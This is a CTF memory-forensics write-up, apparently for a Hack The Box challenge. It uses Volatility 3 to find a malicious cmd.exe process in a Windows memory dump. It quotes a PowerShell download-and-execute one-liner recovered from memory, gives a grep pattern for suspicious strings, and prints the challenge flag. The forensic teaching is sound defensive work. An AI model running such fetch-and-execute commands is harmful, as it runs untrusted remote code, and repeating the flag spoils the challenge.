<img width="706" height="643" alt="image" src="https://github.com/user-attachments/assets/0d770ee6-857b-4fc5-bf15-84c7313f0bd6" />

<img width="1859" height="501" alt="image" src="https://github.com/user-attachments/assets/f999967c-b552-4143-be9a-9c11c4b3bb87" />

```php
python3 vol.py -f WIN-LQS146OE2S1-20201027-142607.raw windows.info
```

- Confirms OS type, architecture, and system time.
- Helps you pick plugins and set expectations for offsets and symbol resolution.

<img width="1858" height="788" alt="image" src="https://github.com/user-attachments/assets/57bb8835-20e4-424e-bd83-461871d10ff1" />

`pslist` shows active processes (like a snapshot).

- **Purpose**: Lists active processes by walking the `PsActiveProcessHead` doubly-linked list in kernel memory.
- **Use Case**: Spot suspicious processes, validate parent-child relationships, and anchor forensic timelines.

<img width="1857" height="748" alt="image" src="https://github.com/user-attachments/assets/bddc12df-d3c1-4cbe-b05a-da19569141b9" />

`psscan` finds processes present in memory (including hidden/terminated).

- **Purpose**: Scans raw memory for process structures (_EPROCESS), not relying on kernel lists.
- **Why it matters**: Detects **DKOM (Direct Kernel Object Manipulation)** — a common stealth technique used by rootkits and malware.

<img width="1847" height="727" alt="image" src="https://github.com/user-attachments/assets/53b668cf-a6c9-43c7-8c4d-4bde3c327366" />

<img width="1855" height="551" alt="image" src="https://github.com/user-attachments/assets/0afbd5a1-44f5-4308-98a8-825aa2ca95f1" />

`* 1640  808     cmd.exe 0xfa80076cd8d0  1       20      1       False   2020-10-27 14:24:50.000000 UTC  N/A     \Device\HarddiskVolume1\Windows\System32\cmd.exe        "C:\Windows\system32\cmd.exe"   C:\Windows\system32\cmd.exe`

• `pstree` shows parent→child relationships — helps spot shells launched by explorer or odd parents.
Helps visualize process spawning, detect anomalies, and reconstruct attacker behavior.

**What to look for**

- A `cmd.exe` process (example PID **1640**) started by `explorer.exe`.
- A memory acquisition tool `DumpIt.exe` (example PID **2004**) — tells us who dumped memory and timing.

<img width="1859" height="757" alt="image" src="https://github.com/user-attachments/assets/26a73128-4011-41d4-9641-acd1cafe7b46" />

- **Plugin**: `windows.cmdline`
- **Purpose**: Extracts command-line arguments used to launch each process.
- **Why it matters**: Reveals attacker tools, execution context, and potential lateral movement.

<img width="1846" height="749" alt="image" src="https://github.com/user-attachments/assets/2da3442c-5e2d-4f9b-a283-54dfe9841f7a" />

- **Plugin**: `windows.envars`
- **Purpose**: Extracts environment variables from each process’s memory.
- **Why it matters**: Reveals user context, system paths, processor info, and potential attacker footprints.

### Dump the process memory (`windows.memmap --dump`)

**Command**

```bash
python3 vol.py -f WIN-LQS146OE2S1-20201027-142607.raw -p 1640 windows.memmap --dump
```

<img width="1849" height="631" alt="image" src="https://github.com/user-attachments/assets/9ed1074a-0a44-41b9-83af-873ce5ae3d50" />

- **Plugin**: `windows.memmap`
- **Purpose**: Displays memory mappings for a specific process (here, `cmd.exe`).
- **Why it matters**: Helps identify loaded modules, injected code, and memory regions worth extracting or scanning.
• Process memory contains the console buffers and in-memory strings the attacker typed or loaded. Dumping pages gives you a local file you can search safely.

### Search the dump for suspicious strings

**Command**

```bash
strings pid.1640.dmp | grep -iE "HTB|flag|base64|powershell|http|whoami|curl"

```

<img width="1861" height="284" alt="image" src="https://github.com/user-attachments/assets/dd599111-e596-4214-9f4d-6f36608e3c55" />

**Why**

- `strings` extracts printable text from binary pages. Grep for likely artifacts (PowerShell, URLs, base64, flags).

**What we found in class**

- A PowerShell one-liner:
    
    `iex(iwr "http%3A%2F%2Fbit.ly%2FSFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30%3D.ps1")  Menu\Programs\Startup\3usy12fv.ps1`
    

<img width="986" height="552" alt="image" src="https://github.com/user-attachments/assets/08b68c9d-2f3a-4504-b22c-1b53c253c6b5" />

decode the base 64 

<img width="1292" height="92" alt="image" src="https://github.com/user-attachments/assets/e69a1c88-0242-41aa-8659-67762e28194c" />

BOOM THATS OUR FLAG!

- Evidence: memory dump `WIN-LQS146OE2S1-20201027-142607.raw`.
- Tool: **Volatility 3** (example run: `Volatility 3 Framework 2.27.0`).
- Key finding: attacker used a command prompt which ran a PowerShell one-liner that downloaded a script. The script filename contained a Base64 string which decodes to the flag.
- Flag: `HTB{W1Nd0ws_f0r3Ns1CS_3H?}`
